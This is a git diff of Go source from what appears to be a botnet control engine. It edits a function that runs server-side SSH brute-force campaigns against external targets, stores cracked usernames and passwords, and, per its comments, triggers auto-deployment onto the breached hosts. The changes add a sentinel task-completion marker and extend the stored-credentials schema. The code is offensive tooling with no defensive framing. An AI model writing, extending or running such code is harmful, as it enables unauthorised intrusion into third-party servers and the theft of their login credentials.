@@ -93,9 +93,14 @@ func BruteTasks(db *database.DB, config string, botIDs []string) ([]TaskTemplate
 // RunExternalBrute runs SSH brute force server-side for external/global targets.
 // Runs in a goroutine, writes results directly to DB and triggers auto-deploy.
 func (e *Engine) RunExternalBrute(campID, config string) {
+	markSentinelDone := func() {
+		e.db.Exec(`UPDATE campaign_tasks SET status = 'completed', output = 'sentinel', completed_at = NOW() WHERE campaign_id = $1 AND task_name = 'External Brute' AND bot_id IS NULL`, campID)
+	}
+
 	var cfg bruteConfig
 	if err := json.Unmarshal([]byte(config), &cfg); err != nil {
 		log.Printf("[-] Campaign %s: invalid external brute config: %v", campID[:8], err)
+		markSentinelDone()
 		e.db.Exec(`UPDATE campaigns SET status = 'failed', updated_at = NOW() WHERE id = $1`, campID)
 		return
 	}
@@ -107,6 +112,7 @@ func (e *Engine) RunExternalBrute(campID, config string) {
 	}
 	if len(allTargets) == 0 {
 		log.Printf("[-] Brute campaign %s (external): no valid targets", campID[:8])
+		markSentinelDone()
 		e.db.Exec(`UPDATE campaigns SET status = 'failed', updated_at = NOW() WHERE id = $1`, campID)
 		return
 	}
@@ -147,9 +153,9 @@ func (e *Engine) RunExternalBrute(campID, config string) {
 					log.Printf("[+] Campaign %s: CRACKED %s@%s:%d", campID[:8], j.username, j.target, j.port)
 
 					e.db.Exec(`
-						INSERT INTO credentials (username, password, target, port, service, valid)
-						VALUES ($1, $2, $3, $4, 'ssh', true)
-						ON CONFLICT DO NOTHING`,
+						INSERT INTO credentials (username, password, target, port, service, category, valid)
+						VALUES ($1, $2, $3, $4, 'ssh', 'login', true)
+						ON CONFLICT (username, target, port, service, category) DO NOTHING`,
 						j.username, j.password, j.target, j.port)
 
 					taskOutput := fmt.Sprintf("CRED_FOUND:%s:%s:%s:%d\nExternal brute — cracked via server-side SSH", j.username, j.password, j.target, j.port)
@@ -197,6 +203,7 @@ func (e *Engine) RunExternalBrute(campID, config string) {
 	}()
 
 	wg.Wait()
+	markSentinelDone()
 
 	totalTargetPorts := len(allTargets) * len(cfg.Ports)
 	var completedCount int
